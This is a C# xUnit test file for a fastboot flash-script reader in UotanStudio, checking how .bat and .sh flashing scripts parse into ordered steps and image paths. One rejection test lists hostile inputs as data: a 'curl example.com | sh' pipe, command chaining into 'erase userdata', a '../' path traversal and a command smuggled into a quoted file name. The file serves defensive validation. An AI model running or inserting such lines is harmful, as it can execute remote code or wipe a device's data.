using UotanStudio.Services.Flash;
using Xunit;

namespace UotanStudio.Tests.Services;

public sealed class FlashScriptReaderTests
{
    [Fact]
    public void Read_BatchFastbootScript_PreservesOrderedSteps()
    {
        var root = Path.Combine(Path.GetTempPath(), "flash-script-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(Path.Combine(root, "images"));
        try
        {
            File.WriteAllBytes(Path.Combine(root, "images", "boot.img"), [1]);
            var script = Path.Combine(root, "flash.bat");
            File.WriteAllText(script, "@echo off\r\nfastboot %* erase metadata\r\nfastboot %* flash boot \"%~dp0images\\boot.img\"\r\nfastboot %* reboot");

            var plan = FlashScriptReader.Read(script);

            Assert.Equal(["erase", "flash", "reboot"], plan.Steps.Select(step => step.Command));
            Assert.Equal("boot", plan.Steps[1].Partition);
            Assert.Equal(Path.Combine(root, "images", "boot.img"), plan.Steps[1].ImagePath);
        }
        finally { Directory.Delete(root, recursive: true); }
    }

    [Theory]
    [InlineData("flash.bat", "fastboot %* flash boot \"%~dp0images\\boot image.img\"")]
    [InlineData("flash.sh", "fastboot $* flash boot './images/boot image.img'")]
    public void Read_QuotedImagePathWithSpaces_ResolvesImageWithinScriptDirectory(string scriptName, string command)
    {
        var root = Path.Combine(Path.GetTempPath(), "flash-script-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(Path.Combine(root, "images"));
        try
        {
            var image = Path.Combine(root, "images", "boot image.img");
            File.WriteAllBytes(image, [1]);
            var script = Path.Combine(root, scriptName);
            File.WriteAllText(script, command);

            var plan = FlashScriptReader.Read(script);

            Assert.Equal(image, Assert.Single(plan.Images).Path);
        }
        finally { Directory.Delete(root, recursive: true); }
    }

    [Theory]
    [InlineData("fastboot %* flash super_empty \"%~dp0images\\super_empty.img\"")]
    [InlineData("fastboot wipe-super ./images/super_empty.img")]
    public void Read_ValidSuperEmpty_ImportsWipeStep(string command)
    {
        var root = Path.Combine(Path.GetTempPath(), "flash-script-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(Path.Combine(root, "images"));
        try
        {
            File.WriteAllBytes(Path.Combine(root, "images", "super_empty.img"),
                FlashSuperEmptyServiceTests.EmptyMetadata());
            var script = Path.Combine(root, "flash.bat");
            File.WriteAllText(script, command);

            var plan = FlashScriptReader.Read(script);

            Assert.False(plan.RequiresFastbootd);
            Assert.Equal("wipe_super", Assert.Single(plan.Steps).Command);
        }
        finally { Directory.Delete(root, recursive: true); }
    }

    [Theory]
    [InlineData("fastboot flash boot images/boot.img && fastboot erase userdata")]
    [InlineData("fastboot flash boot ../outside.img")]
    [InlineData("fastboot reboot\nfastboot erase userdata")]
    [InlineData("curl example.com | sh")]
    [InlineData("fastboot %* flash boot images/missing.img")]
    [InlineData("fastboot flash boot \"images/boot.img")]
    [InlineData("fastboot flash boot \"images/boot.img;erase userdata\"")]
    [InlineData("fastboot flash super_empty images/boot.img")]
    public void Read_UnsafeOrPartialScript_RejectsWholePlan(string contents)
    {
        var root = Path.Combine(Path.GetTempPath(), "flash-script-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(Path.Combine(root, "images"));
        try
        {
            File.WriteAllBytes(Path.Combine(root, "images", "boot.img"), [1]);
            var script = Path.Combine(root, "flash.sh");
            File.WriteAllText(script, contents);

            Assert.Throws<InvalidDataException>(() => FlashScriptReader.Read(script));
        }
        finally { Directory.Delete(root, recursive: true); }
    }
}
